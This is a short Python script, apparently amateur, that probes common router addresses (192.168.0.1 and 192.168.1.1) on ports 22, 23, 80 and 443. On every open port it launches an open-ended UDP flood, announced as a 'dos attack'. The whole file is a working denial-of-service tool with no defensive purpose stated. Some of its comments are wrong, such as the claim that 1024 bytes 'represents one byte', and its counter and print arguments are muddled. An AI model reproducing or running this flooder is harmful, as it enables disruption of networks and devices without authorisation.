import time
import socket
import random
import sys
    
    
def porttry(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    socket.setdefaulttimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    if result == 0:
        print('starting dos attack on %s:%s'%(ip, port))
        time.sleep(1)
        flood(ip, port, 9999999999999999)
    return result
        
def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print("Attacking %s sent packages %s at the port %s "%(sent, victim, vport))

def main():
    test1 = porttry("192.168.0.1", 22)
    print(test1)
    test2 = porttry("192.168.0.1", 23)
    print(test2)
    test3 = porttry("192.168.0.1", 80)
    print(test3)
    test4 = porttry("192.168.0.1", 443)
    print(test4)
    test5 = porttry("192.168.1.1", 22)
    print(test5)
    test6 = porttry("192.168.1.1", 23)
    print(test6)
    test7 = porttry("192.168.1.1", 80)
    print(test7)
    test8 = porttry("192.168.1.1", 443)
    print(test8)
if __name__ == '__main__':
    main()